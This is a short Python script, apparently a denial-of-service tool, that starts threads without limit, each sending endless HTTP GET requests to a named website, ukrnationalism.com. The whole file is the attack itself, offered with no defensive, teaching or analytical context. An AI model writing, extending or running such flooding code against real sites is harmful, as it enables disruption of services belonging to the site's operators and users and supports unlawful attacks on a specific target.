import threading
import requests
def dos():
 while True:
  requests.get("https://ukrnationalism.com")
  
while True:
 threading.Thread(target=dos).start()